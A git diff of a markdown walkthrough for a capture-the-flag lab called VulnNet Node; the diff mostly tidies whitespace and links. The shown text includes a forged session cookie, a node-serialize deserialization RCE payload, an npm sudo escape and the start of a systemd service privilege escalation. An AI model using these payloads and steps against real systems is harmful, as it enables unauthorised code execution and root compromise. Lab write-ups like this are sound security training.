@@ -31,7 +31,7 @@ See only port `8080` is open
 
 1. Couldn't find anything except `/login` page.
 2. have session cookie on GET REQUEST
-    
+
 ```
 GET /login HTTP/1.1
 Host: 10.10.148.28:8080
@@ -45,24 +45,20 @@ Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAi
 Upgrade-Insecure-Requests: 1
 If-Modified-Since: Sun, 24 Jan 2021 15:26:02 GMT
 If-None-Match: W/"84f-177350083bb"
-```    
+```
 
 3. Change cookie `{"username":"Guest","isGuest":true,"encoding": "utf-8"}` to `{"username":"Admin","isGuest":true,"encoding": "utf-8"}`
-⇒ webpage change to ADMIN user    
- ![](/commons/THM/VulnNet2-Node/1_change_cookie.png)   
-
+⇒ webpage change to ADMIN user
+ ![](/commons/THM/VulnNet2-Node/1_change_cookie.png)
 
 4. Change cookie `{"username":"Guest","isGuest":true,"encoding": "utf-8"}` to `{"username":"Admin","isAdmin":true,"encoding": "utf-8"}`
-⇒ Nothing     
-
+⇒ Nothing
 
 5. Change cookie `{"username":"Guest","isGuest":true,"encoding": "utf-8"}` to invalid cookie
-⇒ Error code 500        
-![](/commons/THM/VulnNet2-Node/2_invalid_cookie.png)   
-
+⇒ Error code 500
+![](/commons/THM/VulnNet2-Node/2_invalid_cookie.png)
 
 6. Review error code return
-
 
 ```
 SyntaxError: Unexpected token � in JSON at position 0
@@ -78,16 +74,13 @@ SyntaxError: Unexpected token � in JSON at position 0
     at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
 ```
 
-Found this article https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/  about a RCE on node-serialize module.   
+Found this article <https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>  about a RCE on node-serialize module.
 
-
-
-The exploit payload:   
+The exploit payload:
 
 ```
 {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
 ```
-
 
 ## Foothold
 
@@ -119,10 +112,7 @@ Payload:
 ```
 
 ⇒ We got the shell.
-![](/commons/THM/VulnNet2-Node/3_got_shell.png)   
-
-
-
+![](/commons/THM/VulnNet2-Node/3_got_shell.png)
 
 ```shell
 www@vulnnet-node:~/VulnNet-Node$ whoami;id
@@ -147,7 +137,7 @@ User www may run the following commands on vulnnet-node:
 
 ⇒ We can run `/usr/bin/npm` with user **serv-manage**
 
-Check npm on https://gtfobins.github.io/gtfobins/npm/#shell
+Check npm on <https://gtfobins.github.io/gtfobins/npm/#shell>
 
 ```
 TF=$(mktemp -d)
@@ -156,9 +146,7 @@ sudo npm -C $TF --unsafe-perm i
 ```
 
 Look like we don't have permision on `/tmp` when exploit
-![](/commons/THM/VulnNet2-Node/4_error_exploit.png)   
-
-
+![](/commons/THM/VulnNet2-Node/4_error_exploit.png)
 
 Create a TF folder manually
 
@@ -177,9 +165,7 @@ serv-manage
 uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
 ```
 
-
-***GOT USER FLAG.*** 
-
+***GOT USER FLAG.***
 
 ## Privilege Escalation
 
@@ -198,15 +184,12 @@ User serv-manage may run the following commands on vulnnet-node:
     (root) NOPASSWD: /bin/systemctl daemon-reload
 ```
 
-
-
 2. With `locate` we can find the path of the timer file:
 
 ```shell
 serv-manage@vulnnet-node:~$ locate vulnnet-auto.timer
 /etc/systemd/system/vulnnet-auto.timer
 ```
-
 
 3. Review `/etc/systemd/system/vulnnet-auto.timer`
 
@@ -224,7 +207,6 @@ Unit=vulnnet-job.service
 [Install]
 WantedBy=basic.target    
 ```
-
 
 ⇒ The timer is running VulnNet utilities every 30 min
 
@@ -250,7 +232,6 @@ ExecStart=/bin/df
 [Install]
 WantedBy=multi-user.target
 ```
-
 
 ⇒ service is writeable with **serv-manage** but we can't edit with nano or vim
 ⇒ So just replace contents of it with echo include payload encode by base64
